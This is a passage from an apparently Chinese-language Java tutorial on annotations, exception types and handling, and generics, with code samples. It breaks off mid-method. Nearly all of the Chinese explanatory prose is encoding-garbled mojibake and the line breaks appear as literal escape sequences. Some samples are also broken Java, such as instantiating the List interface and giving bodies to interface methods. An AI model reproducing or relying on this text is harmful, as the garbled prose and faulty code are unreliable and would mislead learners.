ä½ç›¸å…³çš„è­¦å‘Š\n     static-accessï¼ŒæŠ‘åˆ¶ä¸é™æ€å­˜å–ä¸æ­£ç¡®ç›¸å…³çš„è­¦å‘Š\n     static-methodï¼ŒæŠ‘åˆ¶ä¸å¯èƒ½å®£å‘Šä¸ºstatic çš„æ–¹æ³•ç›¸å…³çš„è­¦å‘Š\n     superï¼ŒæŠ‘åˆ¶ä¸ç½®æ¢æ–¹æ³•ç›¸å…³ä½†ä¸å«super å‘¼å«çš„è­¦å‘Š\n     synthetic-accessï¼ŒæŠ‘åˆ¶ä¸å†…éƒ¨ç±»åˆ«çš„å­˜å–æœªæœ€ä½³åŒ–ç›¸å…³çš„è­¦å‘Š\n     sync-overrideï¼ŒæŠ‘åˆ¶å› ä¸ºç½®æ¢åŒæ­¥æ–¹æ³•è€Œé—æ¼åŒæ­¥åŒ–çš„è­¦å‘Š\n     uncheckedï¼ŒæŠ‘åˆ¶ä¸æœªæ£€æŸ¥çš„ä½œä¸šç›¸å…³çš„è­¦å‘Š\n     unqualified-field-accessï¼ŒæŠ‘åˆ¶ä¸æ ä½å­˜å–ä¸åˆæ ¼ç›¸å…³çš„è­¦å‘Š\n     unusedï¼ŒæŠ‘åˆ¶ä¸æœªç”¨çš„ç¨‹å¼ç åŠåœç”¨çš„ç¨‹å¼ç ç›¸å…³çš„è­¦å‘Š\n     ```\n\n**å…ƒæ³¨è§£çš„åŸºæœ¬ä»‹ç»**\n\n- JDK çš„å…ƒ Annotation ç”¨äºä¿®é¥°å…¶ä»– Annotation\n\n- å…ƒæ³¨è§£çš„ç§ç±»\n  - Retention //æŒ‡å®šæ³¨è§£çš„ä½œç”¨èŒƒå›´ï¼Œä¸‰ç§SOURCE,CLASS,RUNTIME\n    -  RetentionPolicy.SOURCE: ç¼–è¯‘å™¨ä½¿ç”¨åï¼Œç›´æ¥ä¸¢å¼ƒè¿™ç§ç­–ç•¥çš„æ³¨é‡Š\n    - RetentionPolicy.CLASS: ç¼–è¯‘å™¨å°†æŠŠæ³¨è§£è®°å½•åœ¨ class æ–‡ä»¶ä¸­ï¼Œå½“è¿è¡Œ Java ç¨‹åºæ—¶, JVM ä¸ä¼šä¿ç•™æ³¨è§£ã€‚è¿™æ˜¯é»˜è®¤å€¼\n    - RetentionPolicy.RUNTIME:ç¼–è¯‘å™¨å°†æŠŠæ³¨è§£è®°å½•åœ¨ class æ–‡ä»¶ä¸­ï¼Œå½“è¿è¡Œ Java ç¨‹åºæ—¶, JVM ä¼šä¿ç•™æ³¨è§£. ç¨‹åºå¯ä»¥é€šè¿‡åå°„è·å–è¯¥æ³¨è§£\n  - Target // æŒ‡å®šæ³¨è§£å¯ä»¥åœ¨å“ªäº›åœ°æ–¹ä½¿ç”¨\n  - Documented //æŒ‡å®šè¯¥æ³¨è§£æ˜¯å¦ä¼šåœ¨javadoc ä½“ç°\n  - Inherited //å­ç±»ä¼šç»§æ‰¿çˆ¶ç±»æ³¨è§£\n\n## å¼‚å¸¸\n\n### åŸºæœ¬æ¦‚å¿µ\n\nJavaè¯­è¨€ä¸­ï¼Œå°†ç¨‹åºæ‰§è¡Œä¸­å‘ç”Ÿçš„ä¸æ­£å¸¸æƒ…å†µç§°ä¸º\"å¼‚å¸¸â€ã€‚(å¼€å‘è¿‡ç¨‹ä¸­çš„è¯­æ³•é”™è¯¯å’Œé€»è¾‘é”™è¯¯ä¸æ˜¯å¼‚å¸¸)\n\næ‰§è¡Œè¿‡ç¨‹ä¸­æ‰€å‘ç”Ÿçš„å¼‚å¸¸äº‹ä»¶å¯åˆ†ä¸ºä¸¤å¤§ç±»\n\n1) Error(é”™è¯¯):\n- Javaè™šæ‹Ÿæœºæ— æ³•è§£å†³çš„ä¸¥é‡é—®é¢˜ã€‚ å¦‚: JVMç³»ç»Ÿå†…éƒ¨é”™è¯¯ã€ èµ„æºè€—å°½ç­‰ä¸¥é‡æƒ…å†µã€‚æ¯”å¦‚: StackOverflowError[æ ˆæº¢å‡º]å’ŒOOM(out of memory), Error æ˜¯ä¸¥é‡é”™è¯¯ï¼Œç¨‹åºä¼šå´©æºƒã€‚\n2. Exception:\n\n- å…¶å®ƒå› ç¼–ç¨‹é”™è¯¯æˆ–å¶ç„¶çš„å¤–åœ¨å› ç´ å¯¼è‡´çš„ä¸€èˆ¬æ€§é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨é’ˆå¯¹æ€§çš„ä»£ç è¿›è¡Œå¤„ç†ã€‚ä¾‹å¦‚ç©ºæŒ‡é’ˆè®¿é—®ï¼Œè¯•å›¾è¯»å–ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œç½‘ç»œè¿æ¥ä¸­æ–­ç­‰ç­‰ï¼Œ\n- Exception åˆ†ä¸ºä¸¤å¤§ç±»:\n  - è¿è¡Œæ—¶å¼‚å¸¸[ç¨‹åºè¿è¡Œæ—¶ï¼Œå‘ç”Ÿçš„å¼‚å¸¸]\n    - è¿è¡Œæ—¶å¼‚å¸¸ï¼Œç¼–è¯‘å™¨æ£€æŸ¥ä¸å‡ºæ¥ã€‚ä¸€èˆ¬æ˜¯æŒ‡ç¼–ç¨‹æ—¶çš„é€»è¾‘é”™è¯¯ï¼Œæ˜¯ç¨‹åºå‘˜åº”è¯¥é¿å…å…¶å‡ºç°çš„å¼‚å¸¸ã€‚java.lang.RuntimeExceptionç±»åŠå®ƒçš„å­ç±»éƒ½æ˜¯è¿è¡Œæ—¶å¼‚å¸¸\n    - å¯¹äºè¿è¡Œæ—¶å¼‚å¸¸ï¼Œå¯ä»¥ä¸ä½œå¤„ç†ï¼Œå› ä¸ºè¿™ç±»å¼‚å¸¸å¾ˆæ™®éï¼Œè‹¥å…¨å¤„ç†å¯èƒ½ä¼šå¯¹ç¨‹\n      åºçš„å¯è¯»æ€§å’Œè¿è¡Œæ•ˆç‡äº§ç”Ÿå½±å“\n  - ç¼–è¯‘æ—¶å¼‚å¸¸[ç¼–ç¨‹æ—¶ï¼Œç¼–è¯‘å™¨æ£€æŸ¥å‡ºçš„å¼‚å¸¸]\n    - ç¼–è¯‘æ—¶å¼‚å¸¸ï¼Œæ˜¯ç¼–è¯‘å™¨è¦æ±‚å¿…é¡»å¤„ç½®çš„å¼‚å¸¸ã€‚\n\n![](https://img.jwt1399.top/img/image-20220224105046212.png)\n\n### å¸¸è§è¿è¡Œæ—¶å¼‚å¸¸\n\n- NullPointerException ç©ºæŒ‡é’ˆå¼‚å¸¸\n- ArithmeticException æ•°å­¦è¿ç®—å¼‚å¸¸\n-  ArrayIndexOutOfBoundsException æ•°ç»„ä¸‹æ ‡è¶Šç•Œå¼‚å¸¸\n- ClassCastException ç±»å‹è½¬æ¢å¼‚å¸¸\n-  NumberFormatException æ•°å­—æ ¼å¼ä¸æ­£ç¡®å¼‚å¸¸\n\n#### NullPointerException\n\nå½“åº”ç”¨ç¨‹åºè¯•å›¾åœ¨éœ€è¦å¯¹è±¡çš„åœ°æ–¹ä½¿ç”¨null æ—¶ï¼ŒæŠ›å‡ºè¯¥å¼‚å¸¸\n\n```java\npublic class NullPointerException_ {\n    public static void main(String[] args) {\n        String name = null;\n        System.out.println(name.length());\n    }\n}\n```\n\n#### ArithmeticException\n\nå½“å‡ºç°å¼‚å¸¸çš„è¿ç®—æ¡ä»¶æ—¶ï¼ŒæŠ›å‡ºæ­¤å¼‚å¸¸ã€‚\n\n```java\npublic class ArithmeticException_ {\n    public static void main(String[] args) {\n        int num1 = 10;\n        int num2 = 0;\n        int res = num1 / num2;\n    }\n}\n```\n\n####  ArrayIndexOutOfBoundsException\n\nç”¨éæ³•ç´¢å¼•è®¿é—®æ•°ç»„æ—¶æŠ›å‡ºçš„å¼‚å¸¸ã€‚å¦‚æœç´¢å¼•ä¸ºè´Ÿæˆ–å¤§äºç­‰äºæ•°ç»„å¤§å°ï¼Œåˆ™è¯¥ç´¢å¼•ä¸ºéæ³•ç´¢å¼•\n\n```java\npublic class ArrayIndexOutOfBoundsException_ {\n    public static void main(String[] args) {\n        int[] arr = {1, 2, 4};\n        for (int i = 0; i <= arr.length; i++) {\n            System.out.println(arr[i]);\n        }\n    }\n}\n```\n\n#### ClassCastException\n\nå½“è¯•å›¾å°†å¯¹è±¡å¼ºåˆ¶è½¬æ¢ä¸ºä¸æ˜¯å®ä¾‹çš„å­ç±»æ—¶ï¼ŒæŠ›å‡ºè¯¥å¼‚å¸¸\n\n```java\npublic class ClassCastException_ {\n    public static void main(String[] args) {\n        A b = new B(); //å‘ä¸Šè½¬å‹\n        B b2 = (B)b;//å‘ä¸‹è½¬å‹ï¼Œè¿™é‡Œæ˜¯OK\n        C c2 = (C)b;//è¿™é‡ŒæŠ›å‡ºClassCastException\n    }\n}\nclass A {}\nclass B extends A {}\nclass C extends A {}\n```\n\n####  NumberFormatException\n\nå½“åº”ç”¨ç¨‹åºè¯•å›¾å°†å­—ç¬¦ä¸²è½¬æ¢æˆä¸€ç§æ•°å€¼ç±»å‹ï¼Œä½†è¯¥å­—ç¬¦ä¸²ä¸èƒ½è½¬æ¢ä¸ºé€‚å½“æ ¼å¼æ—¶ï¼ŒæŠ›å‡ºè¯¥å¼‚å¸¸\n\n```java\npublic class NumberFormatException_ {\n    public static void main(String[] args) {\n        String name = \"æ•™è‚²\";\n        //å°†String è½¬æˆint\n        int num = Integer.parseInt(name);//æŠ›å‡ºNumberFormatException\n        System.out.println(num);\n    }\n}\n```\n\n### å¸¸è§ç¼–è¯‘æ—¶å¼‚å¸¸\n\n- SQLException //æ“ä½œæ•°æ®åº“æ—¶ï¼ŒæŸ¥è¯¢è¡¨å¯èƒ½å‘ç”Ÿå¼‚å¸¸\n- IOException //æ“ä½œæ–‡ä»¶æ—¶ï¼Œå‘ç”Ÿçš„å¼‚å¸¸\n- FileNotFoundException //å½“æ“ä½œä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œå‘ç”Ÿå¼‚å¸¸\n- ClassNotFoundException //åŠ è½½ç±»ï¼Œè€Œè¯¥ç±»ä¸å­˜åœ¨æ—¶ï¼Œå¼‚å¸¸\n- EOFException //æ“ä½œæ–‡ä»¶ï¼Œåˆ°æ–‡ä»¶æœ«å°¾ï¼Œå‘ç”Ÿå¼‚å¸¸\n- IllegalArguementException //å‚æ•°å¼‚å¸¸\n\n### å¼‚å¸¸å¤„ç†\n\nå¼‚å¸¸å¤„ç†å°±æ˜¯å½“å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œå¯¹å¼‚å¸¸å¤„ç†çš„æ–¹å¼ã€‚\n\n#### å¼‚å¸¸å¤„ç†çš„æ–¹å¼\n\n- try-catch-finally\n  - ç¨‹åºå‘˜åœ¨ä»£ç ä¸­æ•è·å‘ç”Ÿçš„å¼‚å¸¸ï¼Œè‡ªè¡Œå¤„ç†\n- throws\n  - å°†å‘ç”Ÿçš„å¼‚å¸¸æŠ›å‡ºï¼Œäº¤ç»™è°ƒç”¨è€…(æ–¹æ³•)æ¥å¤„ç†ï¼Œæœ€é¡¶çº§çš„å¤„ç†è€…å°±æ˜¯JVM\n\n#### try-catch å¼‚å¸¸å¤„ç†\n\n> Javaæä¾›tryå’Œcatchå—æ¥å¤„ç†å¼‚å¸¸ã€‚ tryå—ç”¨äºåŒ…å«å¯èƒ½å‡ºé”™çš„ä»£ç ã€‚catchå—ç”¨äºå¤„ç†tryå—ä¸­å‘ç”Ÿçš„å¼‚å¸¸ã€‚å¯ä»¥æ ¹æ®éœ€è¦åœ¨ç¨‹åºä¸­æœ‰å¤šä¸ªtry..catchå—ã€‚\n\n- 1.å¦‚æœå¼‚å¸¸å‘ç”Ÿäº†ï¼Œåˆ™å¼‚å¸¸å‘ç”Ÿåé¢çš„ä»£ç ä¸ä¼šæ‰§è¡Œï¼Œç›´æ¥è¿›å…¥åˆ°catchå—\n- 2.å¦‚æœå¼‚å¸¸æ²¡æœ‰å‘ç”Ÿï¼Œåˆ™é¡ºåºæ‰§è¡Œtryçš„ä»£ç å—ï¼Œä¸ä¼šè¿›å…¥åˆ°catchå—\n- 3.å¦‚æœå¸Œæœ›ä¸ç®¡æ˜¯å¦å‘ç”Ÿå¼‚å¸¸ï¼Œéƒ½æ‰§è¡ŒæŸæ®µä»£ç (æ¯”å¦‚å…³é—­è¿æ¥ï¼Œé‡Šæ”¾èµ„æºç­‰)åˆ™ä½¿ç”¨å¦‚ä¸‹ä»£ç finally\n\n```java\npublic class TryCatchDetail {\n    public static void main(String[] args) {\n        try {\n            String str = \"æµ‹è¯•\";\n            int a = Integer.parseInt(str);\n            System.out.println(\"æ•°å­—ï¼š\" + a);\n        } catch (NumberFormatException e) {\n            System.out.println(\"å¼‚å¸¸ä¿¡æ¯ï¼š\" + e.getMessage());\n        } finally {\n            System.out.println(\"finally ä»£ç å—è¢«æ‰§è¡Œ...\");\n        }\n        System.out.println(\"ç¨‹åºç»§ç»­...\");\n    }\n}\n```\n\n- 4.å¯ä»¥æœ‰å¤šä¸ªcatchè¯­å¥ï¼Œæ•è·ä¸åŒçš„å¼‚å¸¸(è¿›è¡Œä¸åŒçš„ä¸šåŠ¡å¤„ç†)ï¼Œè¦æ±‚çˆ¶ç±»å¼‚å¸¸åœ¨åï¼Œå­ç±»å¼‚å¸¸åœ¨å‰ï¼Œæ¯”å¦‚(Exception åœ¨åï¼ŒNullPointerException åœ¨å‰)ï¼Œå¦‚æœå‘ç”Ÿå¼‚å¸¸ï¼Œåªä¼šåŒ¹é…ä¸€ä¸ªcatch\n\n```java\npublic class TryCatchDetail02 {\n    public static void main(String[] args) {\n        //1.å¦‚æœtry ä»£ç å—æœ‰å¯èƒ½æœ‰å¤šä¸ªå¼‚å¸¸\n        //2.å¯ä»¥ä½¿ç”¨å¤šä¸ªcatch åˆ†åˆ«æ•è·ä¸åŒçš„å¼‚å¸¸ï¼Œç›¸åº”å¤„ç†\n        //3.è¦æ±‚å­ç±»å¼‚å¸¸å†™åœ¨å‰é¢ï¼Œçˆ¶ç±»å¼‚å¸¸å†™åœ¨åé¢\n        try {\n            Person person = new Person();\n            person = null;\n            System.out.println(person.getName());//NullPointerException\n        } catch (NullPointerException e) {\n            System.out.println(\"ç©ºæŒ‡é’ˆå¼‚å¸¸:\" + e.getMessage());\n        } catch (Exception e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}\n\nclass Person {\n    private String name = \"jack\";\n\n    public String getName() {\n        return name;\n    }\n}\n```\n\n- 5.å¯ä»¥è¿›è¡Œtry-finallyé…åˆä½¿ç”¨ï¼Œè¿™ç§ç”¨æ³•ç›¸å½“äºæ²¡æœ‰æ•è·å¼‚å¸¸ï¼Œå› æ­¤ç¨‹åºä¼šç›´æ¥å´©æ‰/é€€å‡ºã€‚åº”ç”¨åœºæ™¯ï¼Œå°±æ˜¯æ‰§è¡Œä¸€æ®µä»£ç ï¼Œä¸ç®¡æ˜¯å¦å‘ç”Ÿå¼‚å¸¸ï¼Œéƒ½å¿…é¡»æ‰§è¡ŒæŸä¸ªä¸šåŠ¡é€»è¾‘\n\n```java\npublic class TryCatchDetail03 {\n\t\tpublic static void main(String[] args) {\n\t\t\t\ttry{\n            int n1 = 10;\n            int n2 = 0;\n            System.out.println(n1 / n2);\n    \t\t}finally {\n    \t\t\t\tSystem.out.println(\"æ‰§è¡Œäº†finally..\");\n    \t\t}\n    \t\tSystem.out.println(\"ç¨‹åºç»§ç»­æ‰§è¡Œ..\");\n    }\n}\n```\n\n## æ³›å‹\n\n### ä»€ä¹ˆæ˜¯æ³›å‹\n\n- Javaæ³›å‹ï¼ˆgenericsï¼‰æ˜¯ JDK 5 ä¸­å¼•å…¥çš„ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œåœ¨å¾ˆå¤§çš„ç¨‹åº¦ä¸Šæ–¹ä¾¿åœ¨é›†åˆä¸Šçš„ä½¿ç”¨ã€‚\n- æ³›å‹çš„æœ¬è´¨æ˜¯ **å‚æ•°åŒ–ç±»å‹**ï¼Œæœ€ç†Ÿæ‚‰çš„å°±æ˜¯å®šä¹‰æ–¹æ³•çš„æ—¶å€™éœ€è¦å½¢å‚ï¼Œè°ƒç”¨æ–¹æ³•çš„æ—¶å€™ï¼Œéœ€è¦ä¼ é€’å®å‚ã€‚é‚£\"å‚æ•°åŒ–ç±»å‹\"å°±æ˜¯å°†åŸæ¥å…·ä½“çš„ç±»å‹å‚æ•°åŒ–\n\n### æ³›å‹ç›®çš„\n\n- æ³›å‹çš„å‡ºç°é¿å…äº†åœ¨è¿è¡Œæ—¶å¼ºåˆ¶ç±»å‹è½¬æ¢è€Œå‡ºç° ClassCastException (ç±»å‹è½¬åŒ–å¼‚å¸¸)ã€‚\n\n### æ³›å‹å¼•å‡º\n\nè¯·ç¼–å†™ç¨‹åºï¼Œåœ¨ ArrayList ä¸­ï¼Œæ·»åŠ  3 ä¸ª Dog å¯¹è±¡ï¼ŒDog å¯¹è±¡å«æœ‰ name å’Œ ageï¼Œå¹¶è¾“å‡º name å’Œage (è¦æ±‚ä½¿ç”¨getXxx())\n\n#### ä¼ ç»Ÿæ–¹æ³•\n\n```java\npackage com.jwt.generic;\n\nimport java.util.ArrayList;\n\npublic class Generic01 {\n    public static void main(String[] args) {\n\n        ArrayList arrayList = new ArrayList();\n        arrayList.add(new Dog(\"å°é»„\",10));\n        arrayList.add(new Dog(\"å°ç™½\",2));\n        arrayList.add(new Dog(\"å°é»‘\",5));\n        for (Object o : arrayList){\n            Dog dog = (Dog) o;//éœ€è¦å‘ä¸‹è½¬å‹Object ->Dog\n            System.out.println(dog.getName());\n        }\n\n    }\n}\n\nclass Dog {\n    private String name;\n    private int age;\n\n    public Dog() {\n    }\n\n    public Dog(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n}\n```\n\n#### ä½¿ç”¨æ³›å‹\n\n```java\npackage com.jwt.generic;\n\nimport java.util.ArrayList;\n\npublic class Generic02 {\n    public static void main(String[] args) {\n        ArrayList<Dog> arrayList = new ArrayList<>();\n        arrayList.add(new Dog(\"å°é»„\",10));\n        arrayList.add(new Dog(\"å°ç™½\",2));\n        arrayList.add(new Dog(\"å°é»‘\",5));\n        for (Dog dog : arrayList){\n            System.out.println(dog.getName());\n        }\n    }\n}\n\nclass Dog {\n    private String name;\n    private int age;\n\n    public Dog() {\n    }\n\n    public Dog(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n}\n```\n\n### æ³›å‹ä¼˜ç‚¹\n\n- ç¼–è¯‘æ—¶ï¼Œæ£€æŸ¥æ·»åŠ å…ƒç´ çš„ç±»å‹ï¼Œæé«˜äº†å®‰å…¨æ€§\n- ä¸å†æç¤ºç¼–è¯‘è­¦å‘Š\n- å‡å°‘äº†ç±»å‹è½¬æ¢çš„æ¬¡æ•°ï¼Œæé«˜æ•ˆç‡\n  - ä¸ä½¿ç”¨æ³›å‹ Dog -> Object -> Dog //æ”¾å…¥åˆ° ArrayList ä¼šå…ˆè½¬æˆ Objectï¼Œåœ¨å–å‡ºæ—¶ï¼Œè¿˜éœ€è¦è½¬æ¢æˆ Dog\n  - ä½¿ç”¨æ³›å‹ Dog-> Dog -> Dog //æ”¾å…¥å’Œå–å‡ºæ—¶ï¼Œä¸éœ€è¦ç±»å‹è½¬æ¢ï¼Œæé«˜æ•ˆç‡\n\n### æ³›å‹ä½¿ç”¨\n\næ³›å‹æœ‰ä¸‰ç§å¸¸ç”¨çš„ä½¿ç”¨æ–¹å¼ï¼š**æ³›å‹ç±»ï¼Œæ³›å‹æ¥å£å’Œæ³›å‹æ–¹æ³•**ã€‚\n\n#### æ³›å‹ç±»\n\n```java\nclass Person<E>{//å¦‚æœåˆ›å»ºå¯¹è±¡æ—¶æ²¡æœ‰æŒ‡å®šç±»å‹ï¼Œé»˜è®¤æ˜¯ Object\n\t\t\t\tE s;\n\t\t\t\tpublic Person(E s) {\n\t\t\t\tthis.s = s;\n\t\t\t\t}\n}\n```\n\n- æ³›å‹ç±»å‹å¿…é¡»æ˜¯**å¼•ç”¨ç±»å‹**ï¼ˆéåŸºæœ¬æ•°æ®ç±»å‹ï¼‰\n\n  ```java\n  List<Integer> list = new ArrayList<Integer>(); //æ­£ç¡®\n  List<int> list2 = new ArrayList<int>();//é”™è¯¯\n  ```\n\n- æ³›å‹çš„ä½¿ç”¨å½¢å¼\n\n  ```java\n  List<Integer> list = new List<Integer>();\n  List<Integer> list = new List<>();//æ¨èä½¿ç”¨ç®€å†™\n  ```\n\n- é™æ€æ–¹æ³•å’Œé™æ€å±æ€§ä¸èƒ½ä½¿ç”¨æ³›å‹\n\n- æ³›å‹é»˜è®¤æ˜¯Object\n\n  ```java\n  List List = new List();\n  //ç­‰ä»·\n  List<Object> List = new List<>();\n  ```\n\n- ç”±äºä½¿ç”¨è‡ªå®šä¹‰æ³›å‹çš„ç±»ï¼Œåªæœ‰åœ¨å®ä¾‹åŒ–çš„æ—¶å€™æ‰çŸ¥é“è¿™ä¸ªç±»å‹å‚æ•°æ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥å¯¼è‡´\n\n  - ï¼ˆ1ï¼‰ä½¿ç”¨æ³›å‹çš„æ•°ç»„ä¸èƒ½åˆå§‹åŒ–ï¼›\n\n  - ï¼ˆ2ï¼‰é™æ€æ–¹æ³•å’Œé™æ€å±æ€§å¹¶ä¸èƒ½ä½¿ç”¨æ³›å‹ã€‚\n\n#### æ³›å‹æ¥å£\n\n```java\npublic interface Test_ <E>{\n\t//...\n}\n```\n\næ³›å‹æ¥å£çš„ç±»å‹ï¼Œåœ¨**ç»§æ‰¿æ¥å£** æˆ–è€… **å®ç°æ¥å£**æ—¶ç¡®å®šã€‚ï¼ˆé»˜è®¤Objectï¼‰\n\nä¾‹å­\n\n```java\n/**\n * æ³›å‹æ¥å£çš„å®šä¹‰æ ¼å¼:  ä¿®é¥°ç¬¦  interface æ¥å£å<æ•°æ®ç±»å‹> {}\n */\npublic interface Inter<T> {\n    public abstract void show(T t) ;\n}\n\n/**\n * å­ç±»æ˜¯æ³›å‹ç±»\n */\npublic class InterImpl<E> implements Inter<E> {\n    @Override\n    public void show(E t) {\n        System.out.println(t);\n    }\n}\n\n\nInter<String> inter = new InterImpl<String>() ;\ninter.show(\"hello\") ;\n\n```\n\n#### æ³›å‹æ–¹æ³•\n\n```java\npublic <E> void Come(E e){\n   //...\n}\n```\n\n- æ³›å‹æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨ç±»å£°æ˜çš„æ³›å‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå·±å£°æ˜æ³›å‹\n\n  ```java\n  class Fish<T, R> {//æ³›å‹ç±»\n    public void run() {//æ™®é€šæ–¹æ³•\n    }\n    public<U,M> void eat(U u, M m) {//æ³›å‹æ–¹æ³•\n    }\n    //è¯´æ˜\n    //1. ä¸‹é¢hi æ–¹æ³•ä¸æ˜¯æ³›å‹æ–¹æ³•\n    //2. æ˜¯hi æ–¹æ³•ä½¿ç”¨äº†ç±»å£°æ˜çš„æ³›å‹\n    public void hi(T t) {\n    }\n    //æ³›å‹æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨ç±»å£°æ˜çš„æ³›å‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå·±å£°æ˜æ³›å‹\n    public<K> void hello(R r, K k) {\n    System.out.println(r.getClass());//ArrayList\n    System.out.println(k.getClass());//Float\n    }\n  }\n  ```\n\n  \n\nä¾‹å­\n\n```java\nclass Demo{  \n  public <T> T fun(T t){   // å¯ä»¥æ¥æ”¶ä»»æ„ç±»å‹çš„æ•°æ®  \n   return t ;     // ç›´æ¥æŠŠå‚æ•°è¿”å›  \n  }  \n};  \npublic class GenericsDemo{  \n  public static void main(String args[]){  \n    Demo d = new Demo() ; // å®ä¾‹åŒ–Demoå¯¹è±¡  \n    String str = d.fun(\"æ±¤å§†\") ; // ä¼ é€’å­—ç¬¦ä¸²  \n    int i = d.fun(30) ;  // ä¼ é€’æ•°å­—ï¼Œè‡ªåŠ¨è£…ç®±  \n    System.out.println(str) ; // è¾“å‡ºå†…å®¹  \n    System.out.println(i) ;  // è¾“å‡ºå†…å®¹  \n  }  \n};\n\n```\n\n#### æºç ä¸­æ³›å‹ä½¿ç”¨\n\nä¸‹é¢æ˜¯Listæ¥å£å’ŒArrayListç±»çš„ä»£ç ç‰‡æ®µ\n\n```java\n//å®šä¹‰æ¥å£æ—¶æŒ‡å®šäº†ä¸€ä¸ªç±»å‹å½¢å‚ï¼Œè¯¥å½¢å‚åä¸ºE\npublic interface List<E> extends Collection<E> {\n   //åœ¨è¯¥æ¥å£é‡Œï¼ŒEå¯ä»¥ä½œä¸ºç±»å‹ä½¿ç”¨\n   public E get(int index) {}\n   public void add(E e) {} \n}\n\n//å®šä¹‰ç±»æ—¶æŒ‡å®šäº†ä¸€ä¸ªç±»å‹å½¢å‚ï¼Œè¯¥å½¢å‚åä¸ºE\npublic class ArrayList<E> extends AbstractList<E> implements List<E> {\n   //åœ¨è¯¥ç±»é‡Œï¼ŒEå¯ä»¥ä½œä¸ºç±»å‹ä½¿ç”¨\n   public void set(E e) {\n   .......................\n   }\n}\n\n```\n\n#### å®ä¾‹\n\n- å®šä¹‰Employeeç±»\n  - è¯¥ç±»åŒ…å«: privateæˆå‘˜å˜é‡name,sal,birthday, å…¶ä¸­birthdayä¸ºMyDateç±»çš„å¯¹è±¡;\n  - ä¸ºæ¯ä¸€ä¸ªå±æ€§å®šä¹‰getter, setteræ–¹æ³•;\n  - é‡å†™toStringæ–¹æ³•è¾“å‡ºname, sal, birthday\n\n- å®šä¹‰MyDateç±»\n  - åŒ…å«: privateæˆå‘˜å˜é‡month,day,year; \n  - å¹¶ä¸ºæ¯ä¸€ä¸ªå±æ€§å®šä¹‰getter,setteræ–¹æ³•;\n- åˆ›å»ºè¯¥ç±»çš„3ä¸ªå¯¹è±¡ï¼Œå¹¶æŠŠè¿™äº›å¯¹è±¡æ”¾å…¥ArrayListé›†åˆä¸­(ArrayListéœ€ä½¿ç”¨æ³›å‹æ¥å®šä¹‰) \n  - å¯¹é›†åˆä¸­çš„å…ƒç´ è¿›è¡Œæ’åºï¼Œå¹¶éå†è¾“å‡º\n  - æ’åºæ–¹å¼:è°ƒç”¨ArrayList çš„sortæ–¹æ³•ï¼Œä¼ å…¥Comparatorå¯¹è±¡[ä½¿ç”¨æ³›å‹]ï¼Œå…ˆæŒ‰ç…§\n    nameæ’åºï¼Œå¦‚æœnameç›¸åŒï¼Œåˆ™æŒ‰ç”Ÿæ—¥æ—¥æœŸçš„å…ˆåæ’åºã€‚ å³:å®šåˆ¶æ’åº\n\nEmployee.java\n\n```java\npackage com.jwt.generic;\n\npublic class Employee {\n    private String name;\n    private double sal;\n    private MyDate birthday;\n\n    public Employee(String name, double sal, MyDate birthday) {\n        this.name = name;\n        this.sal = sal;\n        this.birthday = birthday;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public double getSal() {\n        return sal;\n    }\n\n    public void setSal(double sal) {\n        this.sal = sal;\n    }\n\n    public MyDate getBirthday() {\n        return birthday;\n    }\n\n    public void setBirthday(MyDate birthday) {\n        this.birthday = birthday;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\nEmployee{\" +\n                \"name='\" + name + '\\'' +\n                \", sal=\" + sal +\n                \", birthday=\" + birthday +\n                '}';\n    }\n}\n```\n\nMyDate.java\n\n```java\npackage com.jwt.generic;\n\nclass MyDate implements Comparable<MyDate> {\n    private int year;\n    private int month;\n    private int day;\n\n    public MyDate(int year, int month, int day) {\n        this.year = year;\n        this.month = month;\n        this.day = day;\n    }\n\n    public int getYear() {\n        return year;\n    }\n\n    public void setYear(int year) {\n        this.year = year;\n    }\n\n    public int getMonth() {\n        return month;\n    }\n\n    public void setMonth(int month) {\n        this.month = month;\n    }\n\n    public int getDay() {\n        return day;\n    }\n\n    public void setDay(int day) {\n        this.day = day;\n    }\n\n    @Override\n    public String toString() {\n        return \"MyDate{\" +\n                \"year=\" + year +\n                \", month=\" + month +\n                \", day=\" + day +\n                '}';\n    }\n\n\n    @Override\n    public int compareTo(MyDate o) {\n        int yearMinus = year - o.getYear();\n        if (yearMinus != 0) {\n            return yearMinus;\n        }\n        //å¦‚æœyearç›¸åŒï¼Œæ¯”è¾ƒmonth\n        int monthMinus = month - o.getMonth();\n        if (monthMinus != 0) {\n            return monthMinus;\n        }\n        //å¦‚æœyearå’Œmonthç›¸åŒ\n        return day - o.getDay();\n    }\n}\n```\n\nMain.java\n\n```java\npackage com.jwt.generic;\n\nimport java.util.ArrayList;\nimport java.util.Comparator;\n\npublic class GenericExercise02\n{\n    public static void main(String[] args) {\n        ArrayList<Employee> employees = new ArrayList<>();\n        employees.add(new Employee(\"å°æ˜\",10000, new MyDate(2000,7,2)));\n        employees.add(new Employee(\"å°çº¢\",20000, new MyDate(2002,10,2)));\n        employees.add(new Employee(\"å°æ˜\",30000, new MyDate(2000,6,2)));\n\n        System.out.println(\"employees=\" + employees);\n\n        employees.sort(new Comparator<Employee>() {\n        @Override\n        public int compare(Employee emp1, Employee emp2) {\n            